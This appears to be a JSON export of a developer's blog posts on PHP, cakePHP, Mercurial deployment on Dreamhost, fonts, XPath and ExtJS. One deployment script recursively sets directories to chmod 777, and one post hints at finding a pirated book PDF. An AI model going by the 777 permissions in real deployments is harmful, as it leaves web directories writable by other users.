d'enregistrer mes fichiers correctement en UTF-8. Ses colorations syntaxiques étaient très claires, son système d'indentation était parfait, bref que du bon.</p>\n<p>Il n'avait pas d'autocomplete de code, ou alors je n'ai pas réussi à m'en servir, mais ça m'allait bien. Son seul défaut était l'absence d'une fonction de recherche dans plusieurs fichiers.</p>\n<p>Aujourd'hui je viens de passer à Komodo Edit car j'avais déjà vu en m'en servant brievement qu'il avait une bonne gestion des commentaires multilignes qu'il identifiait tout seul et rendait leur écriture plus simple.</p>\n<p>Et là je suis en train de m'en servir et je suis bluffé par le nombre d'atouts qu'il a ! Déjà j'ai pu retrouver le même theme de couleurs que celui que j'avais sur Intype, il gère aussi bien l'indentation et enregistre parfaitement en utf8. Jusqu'ici, il est du niveau d'Intype.</p>\n<p>Voici la liste des points positifs supplémentaires au fur et à mesure que je m'en sers :</p>\n<ul>\n<li>Il a un parseur PHP intégré, il m'a souligné une ligne en erreur, en m'indiquant l'erreur !</li>\n<li>L'autocomplete m'a l'air pas mal foutu, il va chercher dans la liste des fonctions et variables que j'ai définies, ainsi que dans la liste des fonctions intégrées de PHP.</li>\n<li>C'est extremement pratique pour les str_replace, explode et autres fonctions dont je ne me souviens jamais de l'ordre des arguments, parce qu'il me les affiche ainsi qu'une petite explication !</li>\n<li>Avec Ctrl+Espace, il peut me terminer un mot que j'ai commencé s'il trouve une correspondance avec les fonctions que j'ai définies</li>\n<li>Il me liste même toutes les méthodes d'un modèle quand je tape le nom de ce modèle. Avec la description et la liste des paramètres tirée de mes propres commentaires</li>\n<li>Il ajoute automatiquement les } de fermeture quand on les ouvre</li>\n<li>Il enlève automatiquement les espaces qui trainent à la fin d'un fichier. Ca aussi je sens que je vais aimer, vu le nombre de fois où j'ai eu des problèmes de \"headers already defined\" à cause de problème de ce genre !</li>\n<li>En passant mon curseur sur une couleur en hexadecimal et en appuyant sur Ctrl, il me donne un apercu de la couleur. Vraiment pratique en CSS</li>\n<li>ll me prévient en Javascript de mes array qui se terminent par des virgules, ce qui fait bugguer IE. Pratique</li>\n</ul>\n<p> </p>",
  "publish_start": "2009-03-25 03:03:49",
  "slug": "komodo-edit"
}, {
  "id": 20,
  "name": "Polices de caractère !",
  "text": "<p>Ah elles en ont du caractère ces polices ! Elle m'en font voir de toutes les couleurs...</p>\n<p>Pour l'intégration sur laquelle je travaille, certains titres utilisent une police spéciale, et pour intégrer ça grâce ) @font-face et Cufon, il me faut les fichiers de police sous différents formats.</p>\n<p>La graphiste m'a fournie la police, sous format .dfont (package de plusieurs font à la sauce Mac). J'ai pu extraire le package grâce à <a href=\"http://peter.upfold.org.uk/projects/dfontsplitter\">DFontSplitter</a>, ce qui m'a donné plein de polices .ttf.</p>\n<p>Corrompues, d'ailleurs, qu'il m'a fallu réparer grâce à <a href=\"http://www.acutesystems.com/sharecf.htm\">CrossFont</a> (attention shareware de 15 jours). Sauf qu'il me convertit les fichiers en .otf.</p>\n<p>Pas de soucis pour Firefox, Safari et Opera qui comprennent ce format très bien, mais pour IE, je dois convertir ça en .eot (grâce <a href=\"http://www.cuvou.com/wizards/ttf2eot.cgi\">ce converter en ligne</a>).</p>\n<p>Qui ne prends malheureusement que des .ttf comme source... Impossible de trouver un converter otf =&gt; ttf sous windows qui ne demande pas d'installer des tas de choses, je suis donc passé sous mon Ubuntu, ai téléchargé FontForge : Open =&gt; Generate Font =&gt; ttf et voila</p>\n<p> </p>\n<p>Edit : Et hop, <a href=\"http://onlinefontconverter.com/\">un autre converter</a> en ligne de plus (otf, ttf, dfont)</p>",
  "publish_start": "2009-09-02 10:35:06",
  "slug": "polices-de-caractere"
}, {
  "id": 21,
  "name": "Locked sessions in cakePHP",
  "text": "<p>I was working on a component heavily using session and was having trouble debugging it. First I could'nt find where my session files where saved on my server.</p>\n<p>Well, it was because I hadn't set the session.save_path value in my php.ini.</p>\n<p>But now that is was done, it seems like I had locked sessions files that I wasn't able to access (I couldn't even read them using a editor). The problem was that I was using die() in my component script to help debugging the process.</p>\n<p>And that was BAD. die() stopped the whole process, even if the session file was opened for writing, locking it until the process died. What was the correct way to halt my script was using exit;</p>\n<p>Hope that helped</p>",
  "publish_start": "2009-09-30 09:26:50",
  "slug": "locked-sessions-in-cakephp"
}, {
  "id": 22,
  "name": "cakePHP deployment with Mercurial on Dreamhost",
  "text": "<p>I now use Mercurial on my daily work flow and have set up some methods on my dev machine to ease the pain of installing mercurial and make it work on any new webserver.</p>\n<p>Here are some snippets that automate all that stuff. You may have to change one thing or two to accomodate your own setup.</p>\n<p>First, I create a custom <code>.bashrc</code> file that I will put on the webserver and create into the following method :</p>\n<pre><code lang=\"sh\">hgInstall() {<br /> mkdir -p ~/.packages/src<br /> cd ~/.packages/src<br /> wget http://www.selenic.com/mercurial/release/mercurial-1.2.tar.gz<br /> tar xvzf mercurial-1.2.tar.gz<br /> cd mercurial-1.2<br /> python setup.py install --home=~/.packages/<br /><br /> echo -e \"[ui]\\nusername = Pixelastic &lt;tim@mailastic.com&gt;\" &gt;&gt; ~/.hgrc<br /> echo -e \"[extensions]\\nhgext/hbisect=!\\nhgext.imerge=! &gt;&gt; ~/.hgrc<br /><br /> . ~/.hgrc<br /> cd ~/<br /> hg version<br />}<br /><br /></code></pre>\n<p>Let me explain. I first create a directory to store the packages I will download (in this example I will only download one package, but as I don't like to have files all around my server, I just keep them in this place). I will then download Mercurial 1.2 in this new directory, unzip it and install it.</p>\n<p>Next step is configuring the default user and correcting some bugs with Dreamhost trying to load non-existing extensions (<code>hgext/hbisec</code>t and <code>hgext.imerge</code>). As I've made a change to <code>.hgrc</code>, I reload it and get back to the default directory while displaying hg version.</p>\n<p>That's almost done, I also have to edit the .bash_profile and add the following lines</p>\n<pre lang=\"robots\"><code lang=\"ini\">export PYTHONPATH=~/.packages/lib/python<br />export PATH=~/.packages/bin:$PATH</code></pre>\n<p>Ok, so this method will download, install on configure Hg on the Dreamhost server. That's all very well, but I had to manually setup the .bashrc, let's see if we cannot automate that as well.</p>\n<p>Now, I'm editing my .zsh_aliases on my local machine (or your .bash_aliases if you're using bash) to add the following method</p>\n<pre lang=\"robots\"><code lang=\"sh\">dreamhost() {<br /> scp ~/Documents/Config/Dreamhost/.bashrc ~/Documents/Config/Dreamhost/.bash_profile $1:~/<br /> ssh $1 '. ~/.bashrc'<br /> scp ~/.ssh/id_rsa.pub ~/Documents/Config/Dreamhost/.ssh/xpsfixe.pub $1:~/<br /> ssh $1 'addKeys'<br /> scp ~/Documents/Config/Dreamhost/cakeClearCache.sh $1:~/<br /> ssh $1 'chmod +x ~/cakeClearCache.sh'<br /> ssh $1 'hgInstall'<br /> ssh $1<br />}</code></pre>\n<p>Ok, so this one is a little more complex. You have to call this method with one paremeter, being the user@domain credentials to connect to your Dreamhost server. What it will do is upload (using ssh) files from your local machine to the server and then apply some commands on the machine using ssh.</p>\n<p>First it will upload both the local version .bashrc and .bash_profile that are sitting on your dev machine and \"reload\" the .bashrc, allowing you to use the previously defined hgInstall directly in the shell</p>\n<p>Then, it will upload your ssh key(s) to the server and add them to the list of allowed keys (more on that later, just skip the addKeys line for now.)</p>\n<p>The next step is uploading (and giving the correct chmod) a special script that will clear cakePHP cache (more on that later too)</p>\n<p>And the final step is calling the previously explained hgInstall method. So the only thing you have to do is put this method in your .zsh_aliases (and the corresponding keys, .bashrc and scripts in their corresponding places) then run dreamhost() and Hg will be installed on your server.</p>\n<p>So now let me get back a little on the two details I skipped. The first is the key stuff. What I'm doing is uploading your ssh key(s) to the server and then calling addKeys. It will authorize those keys to connect using ssh without having to type login/pass on each request. Here is the addKeys code (you have to put it in your .bashrc file and modify the filename to your own)</p>\n<pre lang=\"robots\"><code lang=\"sh\">addKeys() {<br /> mkdir .ssh<br /> cat id_rsa.pub &gt;&gt; .ssh/authorized_keys<br /> cat xpsfixe.pub &gt;&gt; .ssh/authorized_keys<br /> rm id_rsa.pub<br /> rm xpsfixe.pub<br /> chmod go-w ~<br /> chmod 700 ~/.ssh<br /> chmod 600 ~/.ssh/authorized_keys<br />}</code></pre>\n<p>It will basically create the .ssh dir and authorized_keys file with your keys info. It will then delete the files and set the correct chmod.</p>\n<p>And the second part was about that cache clearing thing. When you update your app using Hg, you do not want to update the cache files created by Cake as they contain filepath reference and are likely to be different between your test and prod environment and would surely broke your whole app. So, you set an ignore rule in the .hgignore about them like the following :</p>\n<pre lang=\"robots\"><code lang=\"ini\">syntax:glob<br />app/tmp/cache/cake_*<br />app/tmp/cache/views/*.php<br />app/tmp/cache/models/cake_*<br />app/tmp/cache/persistent/cake_*<br /></code></pre>\n<p>It does work fine almost all the time, but it sometimes lead to errors as the cache is not regenerated between each hg update. Sometimes you have to alter a model schema or the way a value is stored in cache and if you don't clear your cache, it can yield to unexpected results as the data will be wrongly parsed and used.</p>\n<p>So what i did to avoid that was to create a script that will clear the cache for you. Here is the code (you have to be inside the project dir for this to work)</p>\n<pre lang=\"robots\"><code lang=\"sh\">cd app/tmp/cache<br />rm -f cake_*<br />rm -f views/*\\.php<br />rm -f models/cake_*<br />rm -f persistent/cake_*<br />cd ../../../</code></pre>\n<p>It will remove all the cache files generated by cake that could interfere after an update. You just have to wrap thoses lines in a method in your .bashrc (mine is called cakeClearCache) and execute it after each update or when you have caching issues.</p>\n<p>Well, I think you guessed that I did not stop here. Manually applying the method after each update can be a little tedious. So I put the previous code in a file named cakeClearCache.sh (you can spot that I uploaded this file in the dreamhost() method earlie)r. I also added the following line to my /project/.hg/hgrc on my server (if you don't have this file, just create it, it's a project-based hg configuration file)</p>\n<pre lang=\"robots\"><code lang=\"ini\">[hooks]<br />update = ~/cakeClearCache.sh</code></pre>\n<p>It means that everytime an hg update is done, the specified script is fired. That's really fine for us, it means that cache will be cleared on each update. Sounds good.</p>\n<p>One last thing to do was creating the hgrc file automatically. That's why I created the following method (add it to the .bashrc file in the server). It is just a wrapper that will create the hgrc file after doing an hg init</p>\n<pre lang=\"robots\"><code lang=\"sh\">hgInitStart() {<br /> hg init<br /> echo -e \"[hooks]\\nupdate = ~/cakeClearCache.sh\" &gt;&gt; ./.hg/hgrc<br />}<br /></code></pre>\n<p>So instead of doing hg init, just do hgInitStart. You can then start cloning your project here.</p>\n<p>And one last thing, I also created a method that will set correct chmod to app/tmp and app/webroot/files</p>\n<pre lang=\"robots\"><code lang=\"sh\">cakeCorrectChmod() {<br /> chmod 777 ./app/tmp -R<br /> chmod 777 ./app/webroot/files -R<br />}</code></pre>\n<p>And created a wrapper around it to call just after having cloned the project that will update it and set the correct chmods</p>\n<pre lang=\"robots\"><code lang=\"sh\">hgInitEnd() {<br /> hg update tip<br /> cakeCorrectChmod<br />}</code></pre>\n<p>That's all. I bet anyone slightly more experienced in shell scripting could do better than that, but as I have struggled a little to get this right I thought I could share it.</p>",
  "publish_start": "2009-10-01 13:13:21",
  "slug": "cakephp-deployment-with-mercurial-on-dreamhost"
}, {
  "id": 23,
  "name": "Using both php4 and php5 with Easyphp",
  "text": "<p>I'm mostly developing on my Windows machine, using EasyPHP (combining Apache, Mysql and PHP). Each version of EasyPHP is bundled with a specific version of php.</p>\n<p>I'm now almost exclusively developping with the sweetness of php5, but I still have from time to time to refactor a piece of code on an legacy app running on php4.</p>\n<p>I have finally found a way to make specific website to work on php4 instead of php5 using the same install of EasyPHP.</p>\n<p>The key is : running php4 as a cgi script.</p>\n<p>I've finally found a way, by installing php4 as a cgi.</p>\n<ul>\n<li>Download the <a href=\"http://fr.php.net/releases/\">Windows binary of the version</a> you want to emulate.</li>\n<li>Create a subdirectory named php4 in your EasyPHP/apache/cgi-bin/ directory </li>\n<li>Extract the php.exe, php4ts.dll, sapi/php4apache.dll, php.ini-recommended and the extensions directory in this new directory </li>\n<li>Rename php.ini-recommended to php.ini (this will be the php.ini used with php4) </li>\n<li>Edit your apache config file and add the line ScriptAlias /php4/ \"${path}/apache/cgi-bin/php4/\" after the allready defined ScriptAlias (~line 379)</li>\n<li>Create a new virtualhost for the website you would like to run in php4. Mine is as follow :</li>\n</ul>\n<pre>&lt;Virtualhost *:80&gt; <br /> ServerName foobar <br /> ServerAdmin me@localhost <br /> DocumentRoot \"${path}/www/foobar.com\" <br /> <br /> &lt;Directory \"${path}/www/foobar.com\"&gt; <br /> Options Indexes FollowSymLinks Includes ExecCGI <br /> AllowOverride All <br /> Order allow,deny <br /> Allow from all <br /> &lt;/Directory&gt; <br /> <br /> AddHandler php4-script .php .html .htm <br /> Action     php4-script /php4/php.exe <br /> <br /> &lt;/Virtualhost&gt; </pre>\n<p>This means that all .php, .html and .htm file of this virtualhost will be parsed by the php.exe file in our /cgi-bin/php4 directory.</p>\n<p>Don't forget to edit this php.ini if you want to tweak things, and remember that extensions for this version are in the copied extensions/ directory.</p>",
  "publish_start": "2009-10-28 17:15:58",
  "slug": "using-both-php4-and-php5-with-easyphp"
}, {
  "id": 24,
  "name": "Configuring a .fr with Dreamhost",
  "text": "<p>Hosting a website on a .fr is a little harder than a simple .com. The <a href=\"http://www.afnic.fr/\">Afnic</a> (registry for the .fr domains) makes a check whenever you change the DNS of your domain to make sure the new DNS can accept the domain.</p>\n<p>They run a tool named <a href=\"http://www.zonecheck.fr/\">ZoneCheck</a> to do that. This tool will request the new DNS server to test if they can accept the .fr. The problem is that they make a request on the port 53, which is not open on Dreamhost and thus the test fail and the Afnic refuse to let you change your DNS.</p>\n<p>The alternative is to not change you DNS, and keep the default one of your registrar, but manually edit the zones and copy the zones defined in your dreamhost panel (In Domains &gt; Your domain &gt; DNS, at the bottom of the page) into your zones.</p>\n<p>The most important part is modifying the default <code>A</code> entry to the IP of your dreamhost server. You should do the same for the <code>www A </code>entry to.<br />Create a <code>mysql A </code>entry and a <code>ftp A</code> entry if you want to use both <code>ftp.domain.com</code> and <code>mysql.domain.com</code>.</p>\n<p>I also changed the MX record to the google one, as well as creating a CNAME webmail.</p>",
  "publish_start": "2009-10-29 09:41:00",
  "slug": "configuring-a-fr-with-dreamhost"
}, {
  "id": 25,
  "name": "Freelancing, I miss you",
  "text": "<p>Well, it's been one month and a half now that I've put my freelance activites on hold. I'm in contract with a big company to develop an internal application.</p>\n<p>The purpose of the application is really interesting, the guy I'm working with is too, but the language I have to use as well as the all-administrative thing of big companies like that is... well... let's just say I LOVE being a freelancer PHP developper.</p>\n<p>One more month and a half and it will be over. I allready have learn a lot about metadatas in general and particularly Exif, Iptc and XMP. I've also learned a little about Coldfusion. Enough to know that I won't work with that language again, unless I'm forced too.</p>\n<p>In the remaining week, I'll also learn EXTJs, and this part seems promising. I guess leaving jQuery and its easy syntax will be hard at first, but all the data handling of EXTJs seems really powerful.</p>\n<p>Anyway, when that contract will be over, I'll be back to Caracole and I have so many ideas of features and whole websites that I want to create...</p>\n<p>I would like to make the admin panel of Caracole the one thing an administrator would have to check to see if everything is going well on its website. I allready have an extended <code>PHPInfo() </code>highlighting possible misconfiguration but I want to push that further by integrating Google Analytics, checking the Gmail inbox associated as well as integrating the PHPSec library.</p>\n<p>In the future I also plan on creating a photography website for Street Art and graffitis, with gelocalisation, metadatas saving of the author and place, possibility to upload photo directly from a mobile phone, etc</p>\n<p>The old ideas about my own personal website, a quizz website, or one for rating driver's ed are still in my mind. Wait and see.</p>",
  "publish_start": "2009-12-16 15:45:00",
  "slug": "freelancing-i-miss-you"
}, {
  "id": 26,
  "name": "Safari input focusing problem",
  "text": "<p>I just ran into a strange behavior on Safari 3 (Win). I'm not quite sure what caused this problem, but I tracked it down to one CSS rule.</p>\n<p>The thing was that I had an input field that moved whenever I tried to focus it. It jump 3 pixels up whenever I gave him focus. I had never seen that before.</p>\n<p>I finally managed to track it down to the padding:2px 0px 5px 0px; declaration. I exploded it in four (-top, -right, -bottom and -left) and it seemed that it was the padding-bottom:0px that cause the bug.</p>\n<p>I finally rewrote my css (in three lines instead of one) and moved to other things.</p>\n<p> </p>\n<p>I post it here as a reminder, and hope it could help someone.</p>",
  "publish_start": "2010-01-10 20:01:47",
  "slug": "safari-input-focusing-problem"
}, {
  "id": 27,
  "name": "Selecting node based on namespace in xPath",
  "text": "<p>I'm used to XPath, I use it in my Javascript dev (jQuery) has well as in my cakePHP dev (the Set::extract() method), and I've always thought it was really fast, powerful and readable.</p>\n<p>Today I had to parse a real-world XML file, and I discovered that when dealing with namespaces, all became suddenly much more difficult in the XPath world.</p>\n<p>Here is my xml source (shortened for the sake of clarity) :</p>\n<pre lang=\"html\">&lt;?xpacket begin=\"﻿\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?&gt;<br /> &lt;x:xmpmeta xmlns:x=\"adobe:ns:meta/\"&gt;<br /> &lt;rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"&gt;<br /> <br /> &lt;rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"&gt;<br /> &lt;dc:creator&gt;Igor Gosstroff&lt;/dc:creator&gt;<br /> &lt;dc:description xml:lang=\"x-default\"&gt;Awesome picture&lt;/dc:description&gt;<br /> &lt;/rdf:Description&gt;<br /> <br /> &lt;rdf:Description rdf:about=\"\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\"&gt;<br /> &lt;xmp:Rating&gt;4&lt;/xmp:Rating&gt;<br /> &lt;/rdf:Description&gt;<br /> <br /> &lt;/rdf:RDF&gt;<br /> &lt;/x:xmpmeta&gt;                                             <br />&lt;?xpacket end=\"w\"?&gt;</pre>\n<p> </p>\n<p>I wanted to select the first &lt;rdf:Description&gt; (Dublin Core).</p>\n<p>First of all, you have to know that you can't do //rdf:description, you have to use a special syntax because the : is a reserved character. The solution is using the name() method : //*[name()='rdf:Description'].</p>\n<p>It will return both rdf:Description nodes. I can easily get the one i'm interested in by doing //*[name()='rdf:Description'][1] but I would have liked to use a much more simple syntax and select the one with an xmlns:dc attribute.</p>\n<p>And I did not find out how to do that. All the syntaxes I tried either returned nothing, threw and exception and even crash my app once.</p>\n<p>I finally found a devious way to find it. I search for any xmlField whose namespace uri was http://purl.org/dc/elements/1.1/ and then get its parent. I still feel like its a dirty hack but I've allready spent too much time on it, so it will be enough for now.</p>\n<pre lang=\"html\">//*[namespace-uri()='http://purl.org/dc/elements/1.1/'][1]/../</pre>\n<p> </p>",
  "publish_start": "2010-01-11 15:44:06",
  "slug": "selecting-node-based-on-namespace-in-xpath"
}, {
  "id": 28,
  "name": "A little introduction to image metadata",
  "text": "<p>For the project I'm working on, I have to save numerous<a title=\"IPTC\" href=\"http://en.wikipedia.org/wiki/International_Press_Telecommunications_Council\"> </a>data in image files. The <a title=\"Metadata\" href=\"http://en.wikipedia.org/wiki/Metadata\">metadata </a>I have to write can be in different languages and uses different encoding (mainly French, English, Spanish and Chinese).</p>\n<h4>A little history</h4>\n<p>There is mainly three formats to store data inside an image. The main one is called <a title=\"Exif\" href=\"http://en.wikipedia.org/wiki/Exif\">EXIF</a>, its main goal is to store techical data about the image like the operture, is the flash was fired, the resolution, the iso settings and so on.</p>\n<p>The second one is called <a title=\"iptc\" href=\"http://en.wikipedia.org/wiki/IPTC_Information_Interchange_Model\">IPTC</a>. Its main goal was to store more subjective information about the file like its description, its author, copyright informations, etc.</p>\n<p>IPTC is an old standard and is more or less replaced with <a title=\"XMP\" href=\"http://en.wikipedia.org/wiki/Extensible_Metadata_Platform\">XMP </a>nowadays becuase of numerous restrictions on it (mainly no UTF8 and internationalisation support). (A later version named IPTC-IIM was created to correct some of the minor restrictions, but it was still far from perfect).</p>\n<p>It is now more or less replaced with XMP. XMP is based on XML and uses the Dublin Core tags. It is the future of metadatas because its structure allows it to be extended.</p>\n<h4>And now, the problems</h4>\n<p>The problem is that with this three formats, it is quite difficult to know where to store or read the information we want. Additionnaly the XMP support is not very mainstrean on the software, even Adobe (creator of the XMP format) does not support it totally accross its products.</p>\n<p>A <a title=\"The metadata working group\" href=\"http://www.metadataworkinggroup.org/\">Metadata Working Group</a> had been formed to tell all the good people of Metadata-land what to do when faced with an image filled with metadatas. They wrote a recommendation guide telling us how to handle reconciliation (a same information is stored in more than one format, but with different values) and make our software the most compatible with existing software.</p>\n<h4>What about me ?</h4>\n<p>That's when I can talk about me again. I'm working on a project where I have to read a full database of images, parse their metadatas, store them in a database, and build an interface to search accross the database based on criterias like keywords, author, etc.</p>\n<p>I also have to handle the web side of this and allow for easy creation of thumbnails, large and medium version with metadatas correctly written inside the file.</p>\n<p>The admin panel should also allow anyone to modify one file metadata and rewrite it back into the file as well as inside the database.</p>\n<p>This is kind of a big project for me, it's been 2.5 months that I'm on it and I had to learn everything from scrath : all the historical stuff, format specs, recommendation as well as Coldfusion -the language the app is built on-</p>\n<p>I've learn a lot until now and I still have 15 more days to finish it. The main app is almost finished (I just have to polish on some edge cases) and then I'll have to integrate it in the existing admin panel.</p>\n<p> </p>",
  "publish_start": "2010-01-14 13:59:00",
  "slug": "a-little-introduction-to-image-metadata"
}, {
  "id": 29,
  "name": "Learning extJs",
  "text": "<p>Today, the <a href=\"http://jquery14.com/day-01/jquery-14\" title=\"jQuery 1.4\">jquery 1.4</a> version was released, and today is the day where I start to learn extJs (don't ask me why).</p>\n<p><a href=\"http://www.extjs.com/\">EXTJs</a> seems to be promising, it seems really easy to make powerful and professional-looking interfaces for handling data with it.</p>\n<p>When learning Coldfusion I was often horrified by the <a href=\"http://help.adobe.com/en_US/ColdFusion/9.0/CFMLRef/WSc3ff6d0ea77859461172e0811cbec22c24-79f9.html\">really poor html example code</a> shipped with the Coldfusion example : &lt;font&gt;, &lt;span align=\"left\"&gt;, multiple nested tables.</p>\n<p>With EXTJs, it seems to be the same, the <a href=\"http://www.extjs.com/learn/Tutorial:Basic_Page_Setup\">basic page setup</a> tell me not to put a Doctype to my page to \"avoid IE problems\", as well as putting my javascript in the head of the page...</p>\n<p>That is simply horrible advices. I hope the rest of the framewok is not of the same kind or learning it will be painful.</p>\n<p> </p>\n<p>One thing that is quite frustrating with their documentation is that it is absolutly not up to date. It is refering to 1.0 or 2.0 version even if the current one is 3.0.</p>\n<p>I resort to reading the \"Learning EXTJs\" book (if you know how to properly use google, you should find a full PDF online). It told me a lot of things about the approach of the framework, I sincerely recommend that you read it if you want to learn ExtJs. Too bad the book was released before the 3.0 version, but by refering to the API whenever you need to use a new class, you should be ok</p>\n<p> </p>",
  "publish_start": "2010-01-15 16:07:26",
  "slug": "learning-extjs"
}, {
  "id": 31,
  "name": "Never use alert() for debugging",
  "text": "<p>One thing I learned today is to never use alert() for debugging pruposes. When the javascript alert() function is called it blocks every other action until the OK button is pressed. It means that your javascript code that is immediatly after the alert() call is delayed until you press OK.</p>\n<p>It also means that the thread your browser gave to the javascript engine is halted during all this time.</p>\n<p>Imagine you are binding keyboard shortcuts on your website to specific actions. Like pressing Ctrl+S will submit the current form. Of course, Ctrl+S is already defined as a shortcut in the browser, so you will take care of preventing the default behavior in your custom function (using return false, e.preventDefault(), e.stopPropagation() or any method defined in your framework to do that)</p>\n<p>The problem is that is you call alert() in your function, the Javascript thread will be halted before you can make the call to stop the propagation and thus, the browser will take control again and firing its default shortcut.</p>\n<p>So my advice is that you should never use alert for debugging. Use the console.debug() method shipped in firebur or directly write to the DOM but do not use alert().</p>",
  "publish_start": "2010-01-20 19:08:19",
  "slug": "nevre-use-alert-for-debugging"
}, {
  "id": 30,
  "name": "Writing a class in Javascript",
  "text": "<p>I always have to refer to a manual or a webpage to remember the correct syntax for creating a new class in Javascript. Here it is :</p>\n<pre class=\"source source-javascript\"><span class=\"co1\"></span>myClass<span class=\"me1\"></span> = <span class=\"kw2\">function</span><span class=\"br0\">(</span><span class=\"br0\">)</span> <span class=\"br0\">{</span><br />    // Here I can define private variables and methods<span class=\"co1\"></span><br />    var myPrivateVar = \"foo\";<br />    var myPrivateMethod = function() {<br />    };<br /><br />    <span class=\"co1\">// And now I will return an object, so it is the place <br /></span>    // to put public variables and methods<br /><span class=\"co1\"></span>    <span class=\"kw1\">return</span> <span class=\"br0\">{</span><br />        <span class=\"co1\"></span>publicVariable = 'bar',<br />        <span class=\"co1\"></span>publicMethod = function() {<br />        <span class=\"co1\"></span>},<br />        init: <span class=\"kw2\">function</span><span class=\"br0\">(</span><span class=\"br0\">)</span> <span class=\"br0\">{</span><br />            // And here I place the code to execute when I'm ready to<br />            // start executing, eg. when the DOM is ready<br />        <span class=\"br0\">}</span><br />    <span class=\"br0\">}</span>;<br /><span class=\"br0\">}</span><span class=\"br0\">(</span><span class=\"br0\">)</span>; <span class=\"co1\">// Note that this function is executed and so the object is returned.</span><br /></pre>",
  "publish_start": "2010-01-18 14:43:19",
  "slug": "writing-a-class-in-javascript"
}, {
  "id": 32,
  "name": "Database in UTF8 with Coldfusion",
  "text": "<p>When setting up a Coldfusion application, do not forget to add to your datasource the following connection string :</p>\n<pre lang=\"html\"><code lang=\"ini\">characterEncoding=UTF8&amp;characterSetResults=UTF8</code></pre>\n<p>It will ensure that your data is correctly saved and fetched using UTF8. This is the coldfusion equivalent of the more commonly known <code>SET NAMES 'utf8';</code></p>",
  "publish_start": "2010-01-27 12:03:00",
  "slug": "database-in-utf8-with-coldfusion"
}, {
  "id": 262,
  "name": "Malformed POST request made to an absolute url with Flash",
  "text": "<p>Sometimes you encounter bugs that smacks you in the face with their strangeness. And even when you defeated them you still have this sour taste of puzzlement.</p><p>I encountered one of them today. </p><p>While testing in a local environment and doing POST requests from Flash to a distant cake app, I could get the request just fine.</p><p>But when uploading the SWF on the server and embedding it in a Facebook App Iframe, the POST data seemed corrupted and I couldn't get it.</p><p>Replacing the distant POST call to a local one (removing the whole <code>http://</code> part) fixed this strange bug.</p><p>So we ended by adding a check to see if we were online or local and make an absolute or relative call depending on the environment.</p><p>So far, no more issues.<br></p>",
  "publish_start": "2011-02-02 17:00:38",
  "slug": "malformed-post-request-absolute-url-flash"
}, {
  "id": 263,
  "name": "Getting raw JSON POST in PHP",
  "text": "<p>Sometimes you need to post raw <code>POST </code>data without following the key/value convention, like when you need to post to some webservices.</p>\n<p>Accessing it from PHP can be a little obsure at first, but all that is needed is to read the input buffer by doing : <code>file_get_contents(\"php://input\")</code></p>\n<p>This can be useful when posting raw JSON without adding the overhead of all the keys.</p>",
  "publish_start": "2011-02-03 17:02:30",
  "slug": "raw-json-post-php"
}, {
  "id": 264,
  "name": "cakePHP wrapper for EmailComponent::send()",
  "text": "<p>As I already wrote in a <a title=\"Tweak to add to the EmailComponent::send method to send mails to SquirelMail\" href=\"/blog/230:displaying-html-mails-sent-from-cakephp-in-squirrelmail\">previous post</a>, the cakePHP <code>EmailComponent </code>seems to have some quirks, forcing me to add more code to send an email.</p>\n<p>I stumbled upon one more issue today : a <code>View</code> poisoning coming from the <code>EmailComponent</code>. Some vars I was passing to my view through the use of a custom <code>Helper </code>were wipe away if I send a mail in the same request.</p>\n<p>It took me some time to track it down, but I finally decided that I'll now wrap calls to <code>$this-&gt;Email-&gt;send()</code> into a <code>__sendEmail()</code> custom method where I'll add my tweaks.</p>\n<p>This will help migrating to a newer cake version easier when those bugs will be fixed.</p>\n<h4>Easy debug</h4>\n<p>Debugging emails is not an easy task, but is greatly eased by cake. One can set the delivery type to <code>debug </code>and the mail will be generated like a normal mail, but won't be sent. Instead, its content will be saved in <code>Session</code>.</p>\n<p>My wrapper will allow switching from normal to debug mail thanks to an argument.</p>\n<h4>View cleaning</h4>\n<p>I'll also clear the <code>ClassRegistry </code>from the <code>View </code>created by the <code>EmailComponent</code>. The <code>Email </code>view is shared with the display view and this can result in vars being lost or not correctly set. I think all those troubles are gone in cake 2.0 but I haven't tested it yet.</p>\n<h4>The __sendMail method</h4>\n<p>Here is the method code. You should add it to your AppController :</p>\n<pre><code lang=\"php\">function __sendMail($sendAsDebug = false) {<br />\tif (empty($this-&gt;Email)) {<br />\t\treturn false;<br />\t}<br />\t// Debug mode<br />\tif (!empty($sendAsDebug)) {<br />\t\t$this-&gt;Email-&gt;delivery = 'debug';<br />\t}<br />\t// We force adding the boundaries and header otherwise some webmail (like SquirelMail) won't correctly display them<br />\t$this-&gt;Email-&gt;_createboundary();<br />\t$this-&gt;Email-&gt;__header[] = 'MIME-Version: 1.0';<br />\t<br />\t$this-&gt;Email-&gt;send();<br />\t<br />\t// We display debug info<br />\tif (!empty($sendAsDebug)) {<br />\t\tdebug($this-&gt;Session-&gt;read('Message.email.message'), true);<br />\t}<br />\t// We also need to clear the generated view so our display does not get poisoned by the Email display<br />\tClassRegistry::removeObject('view');<br />}</code></pre>\n<p> </p>",
  "publish_start": "2011-02-20 17:51:13",
  "slug": "cakephp-wrapper-emailcomponent-send"
}, {
  "id": 36,
  "name": "Debugging a Squirrel webmail",
  "text": "<p>This is a quick blogpost, essentially as a reminder for myself :</p>\n<p>A client of mine is using the Squirrel mail webmail. Once in a while, I have a call from him telling me that he can't access its account. The cause is always the same : there is way too much mails saved in his account and Squirrel mail choke on this, refusing to display the page.</p>\n<p>The solution is simple, I just have to remove all the mails (except maybe the 100 or so last ones) and save them in a another directory, for archiving. The directory to save is <code>/home/mailusers/c/contact/cur</code></p>\n<p>But, thinking I was clever, instead of copying all the files to a new <code>cur-save-2009</code> directory I thought it would be faster to rename the current directory to <code>cur-save-2009</code> and create a new empty <code>cur</code> dir. Except that I forgot that I was loggued in as <code>root </code>and the directory must have a user/group set as <code>postfix</code>...</p>\n<p>That's it, I just had to not forgot to set the owner/group of the <code>cur/</code> directory as postfix once cleared.</p>",
  "publish_start": "2010-02-03 18:27:48",
  "slug": "debugging-a-squirrel-webmail"
}, {
  "id": 37,
  "name": "What would we be studying if our world was a software ?",
